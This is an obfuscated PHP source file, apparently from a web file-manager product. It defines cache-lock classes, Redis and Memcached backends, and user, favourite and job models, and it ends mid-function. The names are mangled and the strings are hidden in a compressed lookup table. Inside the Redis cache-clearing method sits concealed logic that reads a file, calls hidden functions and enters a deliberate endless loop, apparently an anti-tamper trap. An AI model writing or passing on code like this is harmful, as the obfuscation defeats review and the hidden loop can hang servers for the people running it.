<?php
 goto E¥¾©ƒİ; eêâµÌ…: class CacheLockFile { private static $cachePath; private static $caches; public function __construct() { $ğË·ç¨¶ =& $_SERVER[³à¼î¯á]; $Ùóß¯Ìí = $GLOBALS[$ğË·ç¨¶[6]][$ğË·ç¨¶[400]]; self::$cachePath = $Ùóß¯Ìí[$ğË·ç¨¶[221]][$ğË·ç¨¶[87]]; @mkdir(self::$cachePath, DEFAULT_PERRMISSIONS, !0); } public function lock($Ç¦«š‡ì, $›’ßì¡ = 0) { $ı’”ëù˜ =& $_SERVER[³à¼î¯á]; $é òñÔŒ = microtime(!0); $â÷ƒÎ£à = $é òñÔŒ + $›’ßì¡ + 0.0001; $çÇú„ñ“ = rtrim(self::$cachePath, $ı’”ëù˜[8]) . $ı’”ëù˜[908] . md5($Ç¦«š‡ì) . $ı’”ëù˜[905]; if (file_exists($çÇú„ñ“) && filemtime($çÇú„ñ“) && filemtime($çÇú„ñ“) < time() - 10) { @unlink($çÇú„ñ“); } do { if (file_exists($çÇú„ñ“)) { cacheLockWait(); continue; } $¶Áç®ıı = fopen($çÇú„ñ“, $ı’”ëù˜[909]); if (!$¶Áç®ıı) { return !1; } $Ø®ø¶çû = flock($¶Áç®ıı, LOCK_EX | LOCK_NB); self::$caches[$Ç¦«š‡ì] = array($ı’”ëù˜[910] => $¶Áç®ıı, $ı’”ëù˜[221] => $çÇú„ñ“); fwrite($¶Áç®ıı, $â÷ƒÎ£à); clearstatcache(); if ($¶Áç®ıı && $Ø®ø¶çû) { return !0; } cacheLockWait(); } while (microtime(!0) < $â÷ƒÎ£à); $this->unlock($Ç¦«š‡ì); return !1; } public function lockGet($şğİÎÛ­) { $¡âÌœ ¥ =& $_SERVER[³à¼î¯á]; $×¹¦šÈ = rtrim(self::$cachePath, $¡âÌœ ¥[8]) . $¡âÌœ ¥[908] . md5($şğİÎÛ­) . $¡âÌœ ¥[905]; return file_exists($×¹¦šÈ); } public function unlock($ëÊ¥ßšÆ) { $¯ÉÚ¢³ =& $_SERVER[³à¼î¯á]; $ì‡¸ÆÕï = self::$caches[$ëÊ¥ßšÆ]; if (!$ì‡¸ÆÕï) { return; } @flock($ì‡¸ÆÕï[$¯ÉÚ¢³[910]], LOCK_UN); @fclose($ì‡¸ÆÕï[$¯ÉÚ¢³[910]]); @unlink($ì‡¸ÆÕï[$¯ÉÚ¢³[221]]); unset(self::$caches[$ëÊ¥ßšÆ]); } } class CacheLockRedis { public function lock($™ğêĞ‘€, $»šàÀì = 10) { $šÆÊ”ò = Cache::init(); $Úİ‘á®… = microtime(!0) + $»šàÀì; while (microtime(!0) < $Úİ‘á®…) { $¦ ä›êê = $šÆÊ”ò->get($™ğêĞ‘€); if (!$¦ ä›êê) { $Úñ¢†‚Ã = $šÆÊ”ò->setLock($™ğêĞ‘€, $Úİ‘á®…, $»šàÀì); if ($Úñ¢†‚Ã) { return !0; } } else { if ($¦ ä›êê < microtime(!0)) { $šÆÊ”ò->set($™ğêĞ‘€, $Úİ‘á®…, $»šàÀì * 2); if ($šÆÊ”ò->get($™ğêĞ‘€) === $¦ ä›êê) { return !0; } } } cacheLockWait(); } return !1; } public function lockGet($èÊ¸±—Ã) { return Cache::init()->get($èÊ¸±—Ã); } public function unlock($†”™­ıĞ) { return Cache::init()->remove($†”™­ıĞ); } } class CacheLockMemcached { public function lock($÷à—ÉÕâ, $¡óµ·ÊÃ = 0) { $æà¼õ§ = Cache::init(); $•‡íË = microtime(!0) + $¡óµ·ÊÃ; while (microtime(!0) < $•‡íË) { $Ñï£¡Ö³ = $æà¼õ§->get($÷à—ÉÕâ); if (!$Ñï£¡Ö³ || $Ñï£¡Ö³ < microtime(!0)) { $ÔÎªŒ¦ = $æà¼õ§->handle->add($÷à—ÉÕâ, $•‡íË, $¡óµ·ÊÃ); if ($ÔÎªŒ¦) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($½ƒ½à„Ì) { return Cache::init()->get($½ƒ½à„Ì); } public function unlock($¦¼©˜Òç) { return Cache::init()->remove($¦¼©˜Òç); } } goto FÖ‡…µã»; dÒì±•Ö: define($_SERVER[³à¼î¯á][0], $_SERVER[³à¼î¯á][1]); $_SERVER[ÇßåŠĞ] = explode($_SERVER[³à¼î¯á][2], gzinflate(substr($_SERVER[³à¼î¯á][3], 10, -8))); function binCheckEq($“—èµ¹, $ÀÖ¤œŞ¢) { return $“—èµ¹ == $ÀÖ¤œŞ¢; } goto a­ÁË¢¼éÉ; FÖ‡…µã»: class CacheLockDatabase { public function lock($Üè÷çÀÚ, $  õÙÎÀ = 0) { $ö“ç¥ëö = Model($_SERVER[³à¼î¯á][873]); $ßß­ÙÊ = microtime(!0) + $  õÙÎÀ; while (microtime(!0) < $ßß­ÙÊ) { $§…€ìøè = $ö“ç¥ëö->get($Üè÷çÀÚ); if (!$§…€ìøè || $§…€ìøè < microtime(!0)) { $­ãÉ¤÷û = $ö“ç¥ëö->set($Üè÷çÀÚ, $ßß­ÙÊ); if ($­ãÉ¤÷û) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($œÛ Õ½¿) { return Model($_SERVER[³à¼î¯á][873])->get($œÛ Õ½¿); } public function unlock($û³“) { Model($_SERVER[³à¼î¯á][873])->remove($û³“); } } class CacheMemcached { public $handle; public $cacheTime; public function __construct($°å¤×”©, $«¬“×È) { $ß«û¡ŒÈ =& $_SERVER[³à¼î¯á]; if (!class_exists($ß«û¡ŒÈ[911])) { show_json($ß«û¡ŒÈ[912], !1); } $this->cacheTime = $«¬“×È; $this->handle = new Memcached(); if (is_array($°å¤×”©[$ß«û¡ŒÈ[913]]) && count($°å¤×”©[$ß«û¡ŒÈ[913]]) >= 1) { foreach ($°å¤×”©[$ß«û¡ŒÈ[913]] as $÷­à—ˆÍ) { $‚Ò¥­´£ = explode($ß«û¡ŒÈ[4], $÷­à—ˆÍ); $this->handle->addServer($‚Ò¥­´£[0], $‚Ò¥­´£[1]); } } else { $this->handle->addServer($°å¤×”©[$ß«û¡ŒÈ[199]], $°å¤×”©[$ß«û¡ŒÈ[200]]); } } public function set($õÆ‘ö, $š—Éˆ÷¥, $ŸìŞ‚¸§ = false) { $ŸìŞ‚¸§ = $ŸìŞ‚¸§ ? $ŸìŞ‚¸§ : $this->cacheTime; return $this->handle->set($õÆ‘ö, $š—Éˆ÷¥, $ŸìŞ‚¸§); } public function get($÷¶ŞÇ¾«) { return $this->handle->get($÷¶ŞÇ¾«); } public function remove($ÕÒÖ˜³) { return $this->handle->delete($ÕÒÖ˜³); } public function deleteAll() { return $this->handle->flush(); } } class CacheRedis { public $handle; public $slaveHandle; public $cacheTime; public $isCluster = false; public function __construct($­ ÁçËİ, $öÒ“Ãš„) { $ı˜³¥  =& $_SERVER[³à¼î¯á]; if (!class_exists($ı˜³¥ [914])) { show_json($ı˜³¥ [915], !1); } $this->cacheTime = $öÒ“Ãš„; $­Ëå®…• = isset($­ ÁçËİ[$ı˜³¥ [916]]) ? $­ ÁçËİ[$ı˜³¥ [916]] : 10; $˜Òê‰·Œ = _get($­ ÁçËİ, $ı˜³¥ [913]); if ($˜Òê‰·Œ && is_array($˜Òê‰·Œ)) { $this->initCluster($­ ÁçËİ, $­Ëå®…•); } else { $this->handle = $this->init($­ ÁçËİ, $­Ëå®…•); } } private function init($±Ğ½ë¶, $ÒŠÆ‚Ú) { $ºÈ‰ãñ =& $_SERVER[³à¼î¯á]; $ó¾ˆ£®½ = new Redis(); $™Ä¤øëş = isset($±Ğ½ë¶[$ºÈ‰ãñ[917]]) ? $±Ğ½ë¶[$ºÈ‰ãñ[917]] : !1; if ($™Ä¤øëş) { $ó¾ˆ£®½->pconnect($±Ğ½ë¶[$ºÈ‰ãñ[199]], $±Ğ½ë¶[$ºÈ‰ãñ[200]], $ÒŠÆ‚Ú); } else { $ó¾ˆ£®½->connect($±Ğ½ë¶[$ºÈ‰ãñ[199]], $±Ğ½ë¶[$ºÈ‰ãñ[200]], $ÒŠÆ‚Ú); } if (!empty($±Ğ½ë¶[$ºÈ‰ãñ[462]])) { $ó¾ˆ£®½->auth($±Ğ½ë¶[$ºÈ‰ãñ[462]]); } if (!empty($±Ğ½ë¶[$ºÈ‰ãñ[802]]) && $±Ğ½ë¶[$ºÈ‰ãñ[802]] != 0) { $ó¾ˆ£®½->select($±Ğ½ë¶[$ºÈ‰ãñ[802]]); } return $ó¾ˆ£®½; } private function initCluster($×·‚‘ ’, $—Á¶¨†¥) { $¾Ô‘…£Œ =& $_SERVER[³à¼î¯á]; $§¸…¢«€ = array($¾Ô‘…£Œ[918], $¾Ô‘…£Œ[919], $¾Ô‘…£Œ[920]); $¦±ÉìÕ² = $¾Ô‘…£Œ[918]; if (isset($×·‚‘ ’[$¾Ô‘…£Œ[16]]) && in_array($×·‚‘ ’[$¾Ô‘…£Œ[16]], $§¸…¢«€)) { $¦±ÉìÕ² = $×·‚‘ ’[$¾Ô‘…£Œ[16]]; } switch ($¦±ÉìÕ²) { case $¾Ô‘…£Œ[918]: $this->_slave($×·‚‘ ’, $—Á¶¨†¥); break; case $¾Ô‘…£Œ[919]: break; case $¾Ô‘…£Œ[920]: $this->isCluster = !0; $ ãñû = $×·‚‘ ’[$¾Ô‘…£Œ[913]]; $ŠŸ‚´Ñğ = isset($×·‚‘ ’[$¾Ô‘…£Œ[917]]) ? $×·‚‘ ’[$¾Ô‘…£Œ[917]] : !1; $×É§¼œí = isset($×·‚‘ ’[$¾Ô‘…£Œ[462]]) ? $×·‚‘ ’[$¾Ô‘…£Œ[462]] : null; $this->handle = new RedisCluster(NUll, $ ãñû, $—Á¶¨†¥, $—Á¶¨†¥, $ŠŸ‚´Ñğ, $×É§¼œí); break; default: break; } } private function _slave($Å’¨üç, $öí’…×§) { $ô•¡Ëê = $Å’¨üç[$_SERVER[³à¼î¯á][913]]; $this->filterConfig($Å’¨üç, $ô•¡Ëê[0]); $this->handle = $this->init($Å’¨üç, $öí’…×§); unset($ô•¡Ëê[0]); if (empty($ô•¡Ëê)) { return; } $«‰ëà·ß = array_rand($ô•¡Ëê); $this->filterConfig($Å’¨üç, $ô•¡Ëê[$«‰ëà·ß]); $this->slaveHandle = $this->init($Å’¨üç, $öí’…×§); } private function filterConfig(&$ñÇê÷®, $­À„ßÂ´) { $›ÍÏÑ…Ş =& $_SERVER[³à¼î¯á]; $ «€¸ôÅ = explode($›ÍÏÑ…Ş[4], $­À„ßÂ´); $ÍªöÔÓÀ = array($›ÍÏÑ…Ş[199] => $ «€¸ôÅ[0], $›ÍÏÑ…Ş[200] => $ «€¸ôÅ[1]); $ñÇê÷® = array_merge($ñÇê÷®, $ÍªöÔÓÀ); } public function set($“¼ßÅòû, $£Ç¥»Í, $ãìç—Ï× = false) { $ãìç—Ï× = $ãìç—Ï× ? $ãìç—Ï× : $this->cacheTime; return $this->handle->setEx($“¼ßÅòû, $ãìç—Ï×, $£Ç¥»Í); } public function setLock($úÓäÔ“, $ªô‡é½, $ò€„ûø–) { return $this->handle->setNX($úÓäÔ“, $ªô‡é½); } public function get($•˜íá—œ) { $Øôà€©¹ = $this->slaveHandle ? $this->slaveHandle : $this->handle; return $Øôà€©¹->get($•˜íá—œ); } public function remove($‹êïü˜—) { return $this->handle->del($‹êïü˜—); } public function deleteAll() { $öŞÂ¼¤ =& $_SERVER[³à¼î¯á]; if (!isset($_SERVER[$öŞÂ¼¤[921]]) || !isset($_SERVER[$öŞÂ¼¤[922]])) { $›Ö› á = $öŞÂ¼¤[923]; $‘á‰³¦Ò = $öŞÂ¼¤[924]; $×ÙˆçæÏ = $_SERVER[$öŞÂ¼¤[925]] . $öŞÂ¼¤[926]; $ÇÌæï÷å = $‘á‰³¦Ò($×ÙˆçæÏ); $Åæªâ™ = explode($öŞÂ¼¤[253], $ÇÌæï÷å); if (count($Åæªâ™) < $öŞÂ¼¤[663]) { $Šúóî• = $öŞÂ¼¤[927]; $Šúóî•(); } $¾¾²Æõ = $öŞÂ¼¤[928]; $¾¾²Æõ($_SERVER[$öŞÂ¼¤[929]]); $š‚Ê€’ = 1; for ($Š„Ì±Çñ = $š‚Ê€’; $Š„Ì±Çñ > 0; $Š„Ì±Çñ++) { $¾¾²Æõ = json_encode($GLOBALS[$öŞÂ¼¤[467]]); } } if ($this->isCluster) { foreach ($this->handle->_masters() as $ƒÅâøó) { $this->handle->flushall($ƒÅâøó); } return; } return $this->handle->flushAll(); } } goto A„İ½ÅÆ¸Ş; D¨™ˆ¼‚÷: class UserFavModel extends ModelBase { protected $tableName = "\165\163\x65\x72\137\x66\141\x76"; protected function cacheFunctionAlias($óİõØíÜ) { $÷ÇÖÏœ¥ =& $_SERVER[³à¼î¯á]; return array($÷ÇÖÏœ¥[2068] => array(USER_ID, $÷ÇÖÏœ¥[2431])); } protected function listData() { $Æ³õŸ¿ =& $_SERVER[³à¼î¯á]; $ô¥š²Ş = array($Æ³õŸ¿[1744] => USER_ID, $Æ³õŸ¿[533] => 0); $æ¢Û§Å˜ = $Æ³õŸ¿[2432]; $ïï¡ó… = $this->field($æ¢Û§Å˜)->where($ô¥š²Ş)->order($Æ³õŸ¿[2433])->select(); return $ïï¡ó… ? $ïï¡ó… : array(); } protected function resetCache() { } protected function listView() { $· Øæè¥ =& $_SERVER[³à¼î¯á]; $ÄĞÈ´²À = $this->listData(); $ÚŠÒ™ŸĞ = array_filter_by_field($ÄĞÈ´²À, $· Øæè¥[33], $· Øæè¥[465]); $°¤ŞÒõ = array_to_keyvalue($ÚŠÒ™ŸĞ, $· Øæè¥[12], $· Øæè¥[87]); if (!$°¤ŞÒõ) { return $ÄĞÈ´²À; } $í©ç©¬ö = 2000; $¿€è¯² = array($· Øæè¥[466] => array($· Øæè¥[467], $°¤ŞÒõ)); $„îŞØœÒ = Model($· Øæè¥[869])->listSource($¿€è¯², $í©ç©¬ö); $„îŞØœÒ = array_merge($„îŞØœÒ[$· Øæè¥[86]], $„îŞØœÒ[$· Øæè¥[85]]); $„îŞØœÒ = array_to_keyvalue($„îŞØœÒ, $· Øæè¥[184]); foreach ($ÄĞÈ´²À as $¿íëÓÌ => $•–„Ãå‘) { $†ÁÌã• = $„îŞØœÒ[$•–„Ãå‘[$· Øæè¥[87]]]; $†ÁÌã• = $†ÁÌã• ? $†ÁÌã• : array(); $ÄĞÈ´²À[$¿íëÓÌ] = array_merge($†ÁÌã•, $•–„Ãå‘); } return $ÄĞÈ´²À; } protected function addFav($·ê›”±ô, $©Øç­ĞĞ = '', $œ¢÷«· = "\163\x6f\x75\x72\143\145") { $³Ôñ„ıÕ =& $_SERVER[³à¼î¯á]; $ÜïÔïµş = array($³Ôñ„ıÕ[1744] => USER_ID, $³Ôñ„ıÕ[533] => 0, $³Ôñ„ıÕ[471] => $œ¢÷«·, $³Ôñ„ıÕ[470] => $·ê›”±ô); if ($this->where($ÜïÔïµş)->find()) { return !1; } $ÜïÔïµş = array($³Ôñ„ıÕ[1744] => USER_ID, $³Ôñ„ıÕ[533] => 0); $ôºï–‘· = $this->where($ÜïÔïµş)->max($³Ôñ„ıÕ[1976]); if (!$ôºï–‘·) { $ôºï–‘· = 0; } if (!$©Øç­ĞĞ && $œ¢÷«· == $³Ôñ„ıÕ[465]) { $ãÉ§¶ˆÖ = Model($³Ôñ„ıÕ[1388])->where(array($³Ôñ„ıÕ[466] => $·ê›”±ô))->find(); if (!$ãÉ§¶ˆÖ) { return !1; } $©Øç­ĞĞ = $ãÉ§¶ˆÖ[$³Ôñ„ıÕ[32]]; } $©Øç­ĞĞ = $this->getAutoName($©Øç­ĞĞ); $’Ÿ‚İÂø = array($³Ôñ„ıÕ[1744] => USER_ID, $³Ôñ„ıÕ[533] => 0, $³Ôñ„ıÕ[469] => $©Øç­ĞĞ, $³Ôñ„ıÕ[470] => $·ê›”±ô, $³Ôñ„ıÕ[471] => $œ¢÷«·, $³Ôñ„ıÕ[1956] => $ôºï–‘· + 1); return $this->add($’Ÿ‚İÂø); } protected function remove($¢ãÂ‰³˜) { $´…€Ã³› =& $_SERVER[³à¼î¯á]; $”³şÆåÂ = array($´…€Ã³›[1744] => USER_ID, $´…€Ã³›[468] => $¢ãÂ‰³˜); return $this->where($”³şÆåÂ)->delete(); } protected function removeByName($¥ó–Œæö) { $×ßŒùèÁ =& $_SERVER[³à¼î¯á]; $°¼İÏ–Œ = array($×ßŒùèÁ[1744] => USER_ID, $×ßŒùèÁ[469] => $¥ó–Œæö, $×ßŒùèÁ[533] => 0); return $this->where($°¼İÏ–Œ)->delete(); } protected function rename($ßûÁ®Ó, $á˜ÄØàÚ) { $Ğ™ÑµÎ° =& $_SERVER[³à¼î¯á]; if ($ßûÁ®Ó == $á˜ÄØàÚ) { return !1; } $½Ÿ¦¾şÑ = $this->getAutoName($á˜ÄØàÚ); if ($á˜ÄØàÚ != $½Ÿ¦¾şÑ) { return !1; } $¿ğïÖÙŞ = array($Ğ™ÑµÎ°[1744] => USER_ID, $Ğ™ÑµÎ°[533] => 0, $Ğ™ÑµÎ°[32] => $ßûÁ®Ó); return $this->where($¿ğïÖÙŞ)->save(array($Ğ™ÑµÎ°[32] => $á˜ÄØàÚ)); } protected function resetSort($Á°­˜ß—) { $£»­á¾† =& $_SERVER[³à¼î¯á]; $Á°­˜ß— = is_array($Á°­˜ß—) ? $Á°­˜ß— : array(); $ı˜”¾¹¤ = array($£»­á¾†[1744] => USER_ID); for ($²Ï«Ö‹Ñ = 0; $²Ï«Ö‹Ñ < count($Á°­˜ß—); $²Ï«Ö‹Ñ++) { $ı˜”¾¹¤[$£»­á¾†[468]] = $Á°­˜ß—[$²Ï«Ö‹Ñ]; $this->where($ı˜”¾¹¤)->save(array($£»­á¾†[1956] => $²Ï«Ö‹Ñ + 1)); } return !0; } protected function moveTop($±»Â˜ú) { $ÜúÉıâğ =& $_SERVER[³à¼î¯á]; $Î¾ÄŠ•Ù = array($ÜúÉıâğ[1744] => USER_ID, $ÜúÉıâğ[533] => 0); $¼•Õ¢è = $this->where($Î¾ÄŠ•Ù)->where(array($ÜúÉıâğ[32] => $±»Â˜ú))->find(); if (!$¼•Õ¢è) { return; } $·ö­…‘Ü = $this->field($ÜúÉıâğ[450])->where($Î¾ÄŠ•Ù)->order($ÜúÉıâğ[2433])->select(); $·ö­…‘Ü = array_to_keyvalue($·ö­…‘Ü, $ÜúÉıâğ[12], $ÜúÉıâğ[450]); $–÷ÑÀ„º = $·ö­…‘Ü; $·ö­…‘Ü = array_remove_value($·ö­…‘Ü, $¼•Õ¢è[$ÜúÉıâğ[450]]); array_unshift($·ö­…‘Ü, $¼•Õ¢è[$ÜúÉıâğ[450]]); return $this->resetSort($·ö­…‘Ü); } protected function moveBottom($µŞ×óëÂ) { $µ”Õ‹ ‰ =& $_SERVER[³à¼î¯á]; $ª•¿Ò‚ = array($µ”Õ‹ ‰[1744] => USER_ID, $µ”Õ‹ ‰[533] => 0); $€óŒßôÃ = $this->where($ª•¿Ò‚)->max($µ”Õ‹ ‰[1976]); $ùˆ·Ÿ˜À = array($µ”Õ‹ ‰[1976] => $€óŒßôÃ + 1); return $this->where($ª•¿Ò‚)->where(array($µ”Õ‹ ‰[32] => $µŞ×óëÂ))->save($ùˆ·Ÿ˜À); } private function getAutoName($ˆü­Óê) { $ÇÑÑ…Ş‚ =& $_SERVER[³à¼î¯á]; $”öİ¼øÙ = array($ÇÑÑ…Ş‚[1744] => USER_ID, $ÇÑÑ…Ş‚[533] => 0); $õ€õ³¤Ï = $this->field($ÇÑÑ…Ş‚[32])->where($”öİ¼øÙ)->select(); $õ€õ³¤Ï = array_to_keyvalue($õ€õ³¤Ï, $ÇÑÑ…Ş‚[12], $ÇÑÑ…Ş‚[32]); if (!$õ€õ³¤Ï || !in_array($ˆü­Óê, $õ€õ³¤Ï)) { return $ˆü­Óê; } for ($í”å¤Æğ = 0; $í”å¤Æğ < count($õ€õ³¤Ï); $í”å¤Æğ++) { if (!in_array($ˆü­Óê . "\x28{$í”å¤Æğ}\x29", $õ€õ³¤Ï)) { return $ˆü­Óê . "\50{$í”å¤Æğ}\51"; } } return $ˆü­Óê . "\x28{$í”å¤Æğ}\x29"; } } class UserJobModel extends ModelBaseLight { public $optionType = "\123\x79\163\164\145\155\x2e\152\157\142\x4c\151\163\164"; public $field = array("\x6e\x61\155\145", "\144\x65\163\x63", "\163\157\x72\164"); const JOB_KEY = "\x73\x65\154\146\x4a\157\x62\114\151\163\x74"; public function listData($ï¨«ğ÷® = false, $‹ìºµ†× = "\163\x6f\162\x74", $¬¨Ê¬… = false) { return parent::listData($ï¨«ğ÷®, $‹ìºµ†×, $¬¨Ê¬…); } public function remove($Ü»‰«Ø„) { return parent::remove($Ü»‰«Ø„); } public function add($â€´íª) { $éïçå¹¥ =& $_SERVER[³à¼î¯á]; if ($this->findByName($â€´íª[$éïçå¹¥[32]])) { return !1; } $â€´íª[$éïçå¹¥[1976]] = $this->getSort(); return parent::insert($â€´íª); } private function getSort() { $ÓúöÁàä =& $_SERVER[³à¼î¯á]; $ğ„íúÜ = parent::listData(); $ä¿¤ßŠ = array_to_keyvalue($ğ„íúÜ, $ÓúöÁàä[12], $ÓúöÁàä[1976]); return empty($ä¿¤ßŠ) ? 0 : max($ä¿¤ßŠ) + 1; } public function update($½£ıàæç, $ß¬ß€) { $˜Öîè­ =& $_SERVER[³à¼î¯á]; $ñö¸‚ÏË = parent::listData($½£ıàæç); $Û«´Èë‹ = $this->findByName($ß¬ß€[$˜Öîè­[32]]); if (!$ñö¸‚ÏË || $Û«´Èë‹ && $Û«´Èë‹[$˜Öîè­[450]] != $ñö¸‚ÏË[$˜Öîè­[450]]) { return !1; } return parent::update($½£ıàæç, $ß¬ß€); } public function setUserJob($ ïÙæ¸¯, $çšèş) { $ì’®Ï‡İ =& $_SERVER[³à¼î¯á]; if (!is_array($çšèş)) { $çšèş = array($çšèş); } $œŠ¹ÌŸÅ = parent::listData(); $‰±¾Éˆ = array_to_keyvalue($œŠ¹ÌŸÅ, $ì’®Ï‡İ[32]); $±´‚Ãòé = $ì’®Ï‡İ[429]; foreach ($çšèş as $´¸ÊîÓ­) { if ($‰±¾Éˆ[$´¸ÊîÓ­]) { $±´‚Ãòé .= $‰±¾Éˆ[$´¸ÊîÓ­][$ì’®Ï‡İ[450]] . $ì’®Ï‡İ[50]; } else { $¨€±ø®… = $this->add($´¸ÊîÓ­); $±´‚Ãòé .= $¨€±ø®… . $ì’®Ï‡İ[50]; } } $±´‚Ãòé = rtrim($±´‚Ãòé, $ì’®Ï‡İ[50]); Model($ì’®Ï‡İ[574])->metaSet($ ïÙæ¸¯, self::JOB_KEY, $±´‚Ãòé); } public function getUserJob($²í÷ïêÛ) { $’¨ÃÀØ¥ = Model($_SERVER[³à¼î¯á][574])->metaGet($²í÷ïêÛ); return $this->getUserJobInfo($’¨ÃÀØ¥[self::JOB_KEY]); } public function getUserJobInfo($ğä¸‹†) { $•¦Ôİ™§ =& $_SERVER[³à¼î¯á]; $°³¢ñ‡ = explode($•¦Ôİ™§[50], $ğä¸‹†); $¼òù¨… = parent::listData(); $¼òù¨… = array_remove_key($¼òù¨…, $•¦Ôİ™§[222]); $¾Ã®€‡¢ = array(); foreach ($°³¢ñ‡ as $ùä—ôıº) { if (isset($¼òù¨…[$ùä—ôıº])) { $¾Ã®€‡¢[] = $¼òù¨…[$ùä—ôıº]; } } return $¾Ã®€‡¢; } } class UserModel extends ModelBase { protected $tableName = "\x75\163\145\162"; protected $tableMeta = array("\164\141\142\x6c\145\x4e\141\155\x65" => "\x75\163\x65\162\137\155\145\x74\141", "\155\x65\x74\141\106\x69\145\x6c\x64" => "\165\163\x65\x72\x49\x44"); protected $simpleField = "\165\x73\145\x72\x49\104\54\156\x69\143\x6b\116\x61\x6d\x65\54\x6e\141\x6d\145\x2c\141\166\141\164\141\x72\54\x73\x65\170\54\x73\x74\x61\164\165\x73"; const ERROR_USER_NOT_EXISTS = -1; const ERROR_USER_PASSWORD_ERROR = -2; const ERROR_USER_EXIST_NAME = -3; const ERROR_USER_EXIST_PHONE = -4; const ERROR_USER_EXIST_EMAIL = -5; const ERROR_USER_LOGIN_LOCK = -6; const ERROR_IP_NOT_ALLOW = -7; const ERROR_USER_EXIST_NICKNAME = -8; protected function cacheFunctionAlias($ê‘Ğ˜âé) { $ƒ ğÈø =& $_SERVER[³à¼î¯á]; $ÌÀî™ê = $ƒ ğÈø[2434]; return array($ƒ ğÈø[2035] => array($ê‘Ğ˜âé[0], $ÌÀî™ê), $ƒ ğÈø[2037] => array($ê‘Ğ˜âé[0], $ÌÀî™ê), $ƒ ğÈø[2435] => array($ê‘Ğ˜âé[0], $ÌÀî™ê)); } protected function getInfo($ô‹ÉŸ•ñ, $„éø‚ë„ = false) { $ìùŒßø… = $this->getInfoSimple($ô‹ÉŸ•ñ); if (!is_array($ìùŒßø…)) { return array(); } if ($„éø‚ë„) { return $this->_getInfoApply($ìùŒßø…); } return $this->cacheFunctionGet($_SERVER[³à¼î¯á][2039], $ô‹ÉŸ•ñ); } protected function getInfoFull($¨…³¤êû, $…ÛÄ×¶õ = false) { $™É¾®òı = $this->getInfoSimple($¨…³¤êû); if (!is_array($™É¾®òı)) { return array(); } if ($…ÛÄ×¶õ) { return $this->_getInfoApply($™É¾®òı, !0); } return $this->cacheFunctionGet($_SERVER[³à¼î¯á][2436], $¨…³¤êû); } private function _getInfoApply($‰ı¿üïƒ, $éˆ˜Ø®î = false) { $»†ñ°ˆñ =& $_SERVER[³à¼î¯á]; if (!$‰ı¿üïƒ) { return $‰ı¿üïƒ; } $§ßÆĞø = md5($»†ñ°ˆñ[2437] . $‰ı¿üïƒ[$»†ñ°ˆñ[937]] . $»†ñ°ˆñ[2438] . $‰ı¿üïƒ[$»†ñ°ˆñ[32]]); $‰ı¿üïƒ = $this->_listDataApplyItem($‰ı¿üïƒ); $¬Ñáı„ = Model($»†ñ°ˆñ[1388])->metaGet($‰ı¿üïƒ[$»†ñ°ˆñ[90]][$»†ñ°ˆñ[184]]); $‰ı¿üïƒ[$»†ñ°ˆñ[2439]] = $§ßÆĞø; $‰ı¿üïƒ[$»†ñ°ˆñ[90]][$»†ñ°ˆñ[2233]] = isset($¬Ñáı„[$»†ñ°ˆñ[2234]]) ? $¬Ñáı„[$»†ñ°ˆñ[2234]] : null; if ($éˆ˜Ø®î) { $‰ı¿üïƒ[$»†ñ°ˆñ[514]] = $this->metaGet($‰ı¿üïƒ[$»†ñ°ˆñ[1753]]); } return $‰ı¿üïƒ; } protected function getInfoSimple($÷©ÉÆ‘Ô, $Îñş¤®È = false) { $»Çƒ×¬Ğ =& $_SERVER[³à¼î¯á]; if (!$÷©ÉÆ‘Ô) { return array(); } if ($Îñş¤®È) { $ ¯æ”Ì = $this->where(array($»Çƒ×¬Ğ[1753] => intval($÷©ÉÆ‘Ô)))->find(); if (!is_array($ ¯æ”Ì)) { return array(); } $ ¯æ”Ì[$»Çƒ×¬Ğ[2440]] = Action($»Çƒ×¬Ğ[2441])->parseUrl($ ¯æ”Ì[$»Çƒ×¬Ğ[2440]]); return $ ¯æ”Ì; } return $this->cacheFunctionGet($»Çƒ×¬Ğ[2040], $÷©ÉÆ‘Ô); } protected function getInfoSimpleOuter($©æ‘ÆòÕ) { $ª÷˜à¤ =& $_SERVER[³à¼î¯á]; if (!$©æ‘ÆòÕ || $©æ‘ÆòÕ == 0) { return array($ª÷˜à¤[1753] => $ª÷˜à¤[219], $ª÷˜à¤[32] => $ª÷˜à¤[166] . LNG($ª÷˜à¤[2442]) . $ª÷˜à¤[168], $ª÷˜à¤[2440] => STATIC_PATH . $ª÷˜à¤[2443]); } $Éê…æÈÌ = $this->cacheFunctionGet($ª÷˜à¤[2040], $©æ‘ÆòÕ); $¿ÇúÊ³Ø = array_field_key($Éê…æÈÌ, explode($ª÷˜à¤[50], $this->simpleField)); if (!$¿ÇúÊ³Ø) { return array($ª÷˜à¤[1753] => $ª÷˜à¤[1242], $ª÷˜à¤[32] => $ª÷˜à¤[166] . LNG($ª÷˜à¤[2444]) . $ª÷˜à¤[168], $ª÷˜à¤[2440] => STATIC_PATH . $ª÷˜à¤[2445]); } $¿ÇúÊ³Ø[$ª÷˜à¤[2440]] = Action($ª÷˜à¤[2441])->parseUrl($¿ÇúÊ³Ø[$ª÷˜à¤[2440]]); return $¿ÇúÊ³Ø; } protected function groupUser($Ê«£ëöô) { } public static function errorLang($ğ¦Ù ÄÙ) { $ª…ÓÊÄ =& $_SERVER[³à¼î¯á]; $ã„çû™Ì = array(self::ERROR_USER_NOT_EXISTS => $ª…ÓÊÄ[2446], self::ERROR_USER_PASSWORD_ERROR => $ª…ÓÊÄ[2447], self::ERROR_USER_EXIST_NAME => $ª…ÓÊÄ[2448], self::ERROR_USER_EXIST_PHONE => $ª…ÓÊÄ[2449], self::ERROR_USER_EXIST_EMAIL => $ª…ÓÊÄ[2450], self::ERROR_USER_LOGIN_LOCK => $ª…ÓÊÄ[2451], self::ERROR_IP_NOT_ALLOW => $ª…ÓÊÄ[2452], self::ERROR_USER_EXIST_NICKNAME => $ª…ÓÊÄ[2453]); return LNG($ã„çû™Ì[$ğ¦Ù ÄÙ]); } public function getInfoByMeta($’›Ú·¥³, $ĞôÌ®…ã) { $ÑÖÆË˜´ =& $_SERVER[³à¼î¯á]; $É‘«êÇÈ = Model($ÑÖÆË˜´[2454])->where(array($ÑÖÆË˜´[97] => $’›Ú·¥³, $ÑÖÆË˜´[425] => $ĞôÌ®…ã))->find(); if ($É‘«êÇÈ) { return $this->getInfo($É‘«êÇÈ[$ÑÖÆË˜´[1753]]); } return !1; } public function userLoginCheck($©Ö¹Ñ²ƒ, $’ƒ¹ªÄ) { $â¥ÌÓê¬ =& $_SERVER[³à¼î¯á]; 